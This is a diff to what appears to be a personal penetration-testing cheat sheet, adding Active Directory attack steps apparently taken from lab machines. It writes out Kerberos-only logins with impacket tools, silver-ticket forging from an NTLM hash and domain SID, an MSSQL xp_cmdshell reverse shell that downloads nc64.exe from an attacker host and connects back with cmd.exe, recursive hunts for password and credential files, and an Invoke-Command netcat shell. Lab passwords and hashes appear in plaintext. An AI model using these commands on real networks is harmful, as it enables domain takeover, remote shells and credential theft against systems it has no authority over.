@@ -1266,6 +1266,60 @@ certipy-ad auth -dc-ip $target -pfx 'administrator.pfx' -username 'administrator
 
 ```
 
+### NTLM Disabled : 
+
+```bash
+
+==> We have to force Kerberos Auth :
+
+nxc smb $target -u ksimpson -p ksimpson -k
+
+==> Generate a TGT as this user : 
+
+getTGT.py scrm.local/'ksimpson':'ksimpson' -dc-ip $target
+
+==> Accessing Shares with a TGT : 
+
+smbclient.py -k ksimpson@dc1.scrm.local -dc-ip $target
+
+# Once Inside : 
+shares : List all shares
+use Share1
+ls
+
+==> Login in (winrm won't work without NTLM) :
+
+psexec.py scrm.local/administrator@dc1.scrm.local -k -no-pas
+wmiexec.py scrm.local/administrator@dc1.scrm.local -k -no-pass
+smbexec.py scrm.local/administrator@dc1.scrm.local -k -no-pass
+
+```
+
+### Forging a Silver Ticket : 
+
+```bash
+
+==> If you have the Hash or password for the DB service account , Forge a silver ticket, impoersonating the DB Admin , we need the NTLM hash and the SID of the domain : 
+
+# 1 Convert Password to NTLM HASH : 
+
+echo -n 'Pegasus60' | iconv -t utf16le | openssl dgst -md4
+
+# 2 Get Domain SID : 
+
+nxc ldap DC1.scrm.local -u sqlsvc -p Pegasus60 -k --get-sid
+
+# Forge the Tikcet & Login :
+
+ticketer.py -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -spn sqlsvc/dc1.scrm.local:1433 Administrator 
+
+export KRB5CCNAME=Administrator.ccache
+
+mssqlclient.py -k dc1.scrm.local -windows-auth
+
+
+```
+
 
 ### PowerShell Passwords Extraction :
 
@@ -1291,6 +1345,7 @@ smbpasswd -r $IP -U sbradley
 
 ```bash
 impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.59.194 -windows-auth : Login
+mssqlclient.py -k dc1.scrm.local -windows-auth
 
 ==> Always check the sa user of the MSSQL DB :
 nxc mssql -u sa-p Password --local-auth 
@@ -1328,14 +1383,16 @@ SELECT TOP 100 * FROM schema.YourTable;
 -- 6) select specific column(s) (e.g., files/blob column)
 SELECT TOP 100 FileColumnName FROM schema.YourTable;
 
+-- 7) Dump the entire table :
+SELECT * FROM Table_name ;
 ```
 
 **Reverse Shell :** 
 
 ```bash
-SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget
+SQL> xp_cmdshell "powershell -c cd C:\temp; wget
 http://10.10.14.9/nc64.exe -outfile nc64.exe"
-SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe
+SQL> xp_cmdshell "powershell -c cd C:\temp; .\nc64.exe -e cmd.exe
 10.10.14.9 443"
 ```
 
@@ -1559,9 +1616,14 @@ Get-ChileItem -Path C:\ -Recurse -Force -Include *.config,*.ini,*xml,*txt -File 
 netstat -ano | findstr /v UDP . 
 
 #Check Console History : 
- %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 
- 
+# Recursive Find for files :
+
+find . -type f \( -iname "*.txt" -o -iname "*.xls*" -o -iname "*.bak" -o -iname "*.conf" -o -iname "*.ini" -o -iname "*.pdf" -o -iname "*.docx" -o -iname "*.env" -o -iname "*password*" -o -iname "*credential*" -o -iname "*.xml" \) 2>/dev/null
+Get-ChildItem -Recurse -Include *.txt,*.xls,*.xlsx,*.bak,*.config,*.ini,*.pdf,*.docx,*.env,*password*,*credential*,*.xml -ErrorAction SilentlyContinue -Force
+dir /s /b *.txt *.xls* *.bak *.config *.ini *password* *credential*
+
 ```
 
 ### Unquoted Services :
@@ -1874,6 +1936,16 @@ python3 -m venv venv
 source venv/bin/activate
 pip3 install -r requirements.txt
 python3 wmiexec2.py anomaly.hsm/anna_molly@$target -hashes ':be4bf3131851aee9a424c58e02879f6e'
+
+
+# Switching users ( if Winrm doesn't work without NTLM , Runas Didndt work now what ? )
+
+$SecPassword = ConvertTo-SecureString 'ScrambledEggs9900' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('scrm.local\MiscSvc', $SecPassword)
+Invoke-Command -ComputerName 127.0.0.1 -Credential $Cred -ScriptBlock { whoami }
+Enter-PSSession -ComputerName 127.0.0.1 -Credential $Cred
+Invoke-Command -ComputerName 127.0.0.1 -Credential $Cred -ScriptBlock { C:\temp\nc64.exe cmd.exe 10.10.15.161 4444 }
+
 ```
 
 ## Post Exploitation :
